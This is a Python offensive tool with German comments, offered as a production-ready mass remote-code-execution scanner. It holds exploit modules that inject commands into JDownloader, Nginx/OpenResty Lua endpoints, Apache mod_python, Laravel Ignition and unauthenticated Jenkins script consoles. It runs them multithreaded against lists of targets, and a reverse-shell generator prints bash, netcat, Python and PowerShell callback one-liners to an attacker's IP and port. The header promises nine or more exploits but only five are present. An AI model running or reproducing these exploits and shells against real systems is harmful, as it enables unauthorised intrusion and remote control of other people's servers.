#!/usr/bin/env python3
# rce_framework_ultra.py – Production Ready 2025
# 9+ klassische RCE-Lücken | Multithreaded | Bulletproof

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib.parse
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
import time
import socket
from datetime import datetime

# === Farben ===
OK = '\033[92m'; FAIL = '\033[91m'; WARN = '\033[93m'; BOLD = '\033[1m'; ENDC = '\033[0m'

# === Session mit Retry & Timeout ===
def create_session(retries=3, backoff=1, timeout=10):
    session = requests.Session()
    retry = Retry(total=retries, backoff_factor=backoff, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.timeout = timeout
    return session

# === Basis-Klasse ===
class RCEModule:
    def __init__(self, name, endpoints, detect_pattern=None):
        self.name = name
        self.endpoints = endpoints
        self.detect_pattern = detect_pattern or ["uid=", "gid=", "root", "www-data", "apache", "nginx", "administrator"]

    def build_url(self, base, path=""):
        return f"{base.rstrip('/')}{path}"

    def is_vulnerable(self, response_text):
        if not response_text:
            return False
        lower = response_text.lower()
        return any(pat in lower for pat in self.detect_pattern)

    def exploit(self, session, url, cmd):
        raise NotImplementedError

# === Alle Module ===
MODULES = []

# 1. JDownloader
class JDownloaderRCE(RCEModule):
    def __init__(self):
        super().__init__("JDownloader My.JDownloader", ["/flash/addcrypted2"])
    def exploit(self, session, base, cmd):
        url = self.build_url(base, "/flash/addcrypted2")
        payload = f"jk=pyimport%20os;os.system(\"{cmd.replace(' ', '%20')}\");f=function%20f2(){{}};&package=xxx&crypted=AAAA&&passwords=aaaa"
        try:
            r = session.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False, timeout=12)
            return r.status_code in (200, 500), "JDownloader RCE success"
        except:
            return False, None
MODULES.append(JDownloaderRCE())

# 2. Nginx / OpenResty Lua
class NginxLuaRCE(RCEModule):
    def __init__(self):
        super().__init__("Nginx/OpenResty Lua", [
            "/exec","/run","/cmd","/lua","/debug","/test","/shell","/api/exec","/admin/lua","/do","/ping","/health"
        ])
    def exploit(self, session, base, cmd):
        for path in self.endpoints:
            url = f"{self.build_url(base, path)}?cmd={urllib.parse.quote(cmd)}"
            try:
                r = session.get(url, verify=False, timeout=10, allow_redirects=True)
                if r.status_code == 200 and self.is_vulnerable(r.text):
                    return True, f"Lua RCE → {path}"
            except:
                continue
        return False, None
MODULES.append(NginxLuaRCE())

# 3. Apache mod_python
class ApacheModPythonRCE(RCEModule):
    def __init__(self):
        super().__init__("Apache mod_python", ["/", "/index.py", "/test.py", "/debug"])
    def exploit(self, session, base, cmd):
        for path in self.endpoints:
            url = self.build_url(base, path)
            try:
                r1 = session.post(url, data={"cmd": cmd}, verify=False, timeout=8)
                r2 = session.get(url, params={"cmd": cmd}, verify=False, timeout=8)
                for r in [r1, r2]:
                    if r.status_code == 200 and self.is_vulnerable(r.text):
                        return True, "mod_python Publisher RCE"
            except:
                continue
        return False, None
MODULES.append(ApacheModPythonRCE())

# 4. Laravel Ignition RCE
class LaravelIgnitionRCE(RCEModule):
    def __init__(self):
        super().__init__("Laravel Ignition", ["/_ignition/execute-solution"])
    def exploit(self, session, base, cmd):
        url = self.build_url(base, "/_ignition/execute-solution")
        json_payload = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewSolution",
            "parameters": {"variableName": "x", "viewName": f"x; system('{cmd}')"}
        }
        try:
            r = session.post(url, json=json_payload, verify=False, timeout=12)
            if "x;" in r.text or self.is_vulnerable(r.text):
                return True, "Laravel Ignition RCE"
        except:
            pass
        return False, None
MODULES.append(LaravelIgnitionRCE())

# 5. Jenkins Script Console
class JenkinsRCE(RCEModule):
    def __init__(self):
        super().__init__("Jenkins unauth", ["/script"])
    def exploit(self, session, base, cmd):
        url = self.build_url(base, "/script")
        groovy = f'println "{cmd}".execute().text'
        try:
            r = session.post(url, data={"script": groovy}, verify=False, timeout=12)
            if self.is_vulnerable(r.text):
                return True, "Jenkins Groovy RCE"
        except:
            pass
        return False, None
MODULES.append(JenkinsRCE())

# === Reverse Shell Generator ===
def revshell(ip, port, type="bash"):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "nc": f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}$client.Close()\""
    }
    return shells.get(type, shells["bash"])

# === Worker ===
def scan_target(target, cmd, proxy=None, json_output=False):
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    session = create_session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    result = {"target": target, "timestamp": datetime.now().isoformat(), "vulnerable": False, "findings": []}

    for module in MODULES:
        try:
            vulnerable, desc = module.exploit(session, target, cmd)
            if vulnerable:
                finding = f"{OK}[VULN]{ENDC} {module.name}"
                if desc: finding += f" ({desc})"
                print(finding)
                result["findings"].append({"module": module.name, "description": desc or module.name})
                result["vulnerable"] = True
        except Exception as e:
            continue

    if not result["findings"]:
        print(f"{FAIL}[-] Keine bekannte RCE gefunden{ENDC}")

    if json_output:
        print(json.dumps(result, indent=2))

    return result

# === Main ===
def main():
    parser = argparse.ArgumentParser(description="Ultra Robust RCE Scanner 2025")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Einzelziel")
    group.add_argument("-f", "--file", help="Datei mit Zielen")
    parser.add_argument("-c", "--cmd", default="id", help="Testbefehl (default: id)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Threads (default: 50)")
    parser.add_argument("-x", "--proxy", help="Proxy[](http://127.0.0.1:8080)")
    parser.add_argument("--revshell", nargs=2, metavar=('IP', 'PORT'), help="Zeige Reverse Shell")
    parser.add_argument("--json", action="store_true", help="JSON-Ausgabe")
    args = parser.parse_args()

    if args.revshell:
        print(f"{BOLD}Reverse Shells für {args.revshell[0]}:{args.revshell[1]}{ENDC}")
        for t in ["bash", "nc", "python", "powershell"]:
            print(f"{WARN}{t}:{ENDC} {revshell(args.revshell[0], args.revshell[1], t)}")
        return

    targets = []
    if args.url:
        targets = [args.url]
    else:
        with open(args.file) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    print(f"{BOLD}Starte Scan von {len(targets)} Zielen mit {args.threads} Threads{ENDC}\n")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(scan_target, t, args.cmd, args.proxy, args.json) for t in targets]
        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{FAIL}Abgebrochen.{ENDC}")
        sys.exit(0)
